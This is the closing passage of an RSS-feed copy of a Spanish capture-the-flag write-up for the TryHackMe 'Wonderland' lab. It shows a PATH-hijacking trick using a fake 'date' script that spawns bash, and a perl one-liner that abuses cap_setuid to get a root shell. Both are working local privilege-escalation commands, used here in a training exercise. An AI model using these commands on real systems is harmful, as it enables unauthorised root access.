&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Hijacking PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/rabbit:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt; &amp;gt; date
chmod +x date

&lt;span class=&#34;c1&#34;&gt;#Binario&lt;/span&gt;
/home/rabbit/teaParty
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos el binario &lt;code&gt;teaParty&lt;/code&gt; el cual nos devuelve una shell con el usuario &lt;code&gt;Hatter&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-27-52.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Intentamos ejecutar &lt;code&gt;perl&lt;/code&gt; ya que tiene &amp;ldquo;capabilites&amp;rdquo; &lt;code&gt;cap_setuid+ep&lt;/code&gt; que al intentarlo con alice y rabbit no fue posible tomar ventaja. Logramos obtener una shell con usuario root y obtener nuestras flags &lt;code&gt;user.txt&lt;/code&gt; y &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;use POSIX (setuid); POSIX::setuid(0); exec &amp;#34;/bin/bash&amp;#34;;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-47-21.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Info&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&#34;&gt;&lt;strong&gt;Linux Privilege Escalation Using PATH Variable&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;&lt;strong&gt;Linux Privilege Escalation using Capabilities&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/wonderland/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/wonderland/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>capabilities</category>
            
          
            
              <category>python library hijacking</category>
            
          
            
              <category>hijacking PATH</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>